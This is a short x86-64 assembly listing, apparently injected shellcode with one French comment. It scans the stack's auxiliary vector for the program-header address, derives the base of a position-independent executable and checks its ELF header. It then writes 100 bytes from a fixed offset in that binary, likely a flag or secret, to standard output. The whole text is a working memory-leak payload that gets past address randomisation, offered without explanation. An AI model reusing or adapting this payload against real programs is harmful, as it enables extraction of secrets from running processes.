bits 64
_start:
    mov rbx, rsp
    mov r12, 0x800
.scan:
    mov rax, [rbx]
    cmp rax, 3
    jne .next
    mov rcx, [rbx+8]
    sub rcx, 0x40
    test rcx, 0xfff          ; la base PIE est alignee page
    jnz .next
    test rcx, rcx
    jz .next
    mov eax, [rcx]
    cmp eax, 0x464c457f
    je .found
.next:
    add rbx, 16
    dec r12
    jnz .scan
    mov rax, 60
    xor rdi, rdi
    syscall
.found:
    lea rsi, [rcx+0x202060]
    mov rax, 1
    mov rdi, 1
    mov rdx, 100
    syscall
    mov rax, 60
    xor rdi, rdi
    syscall
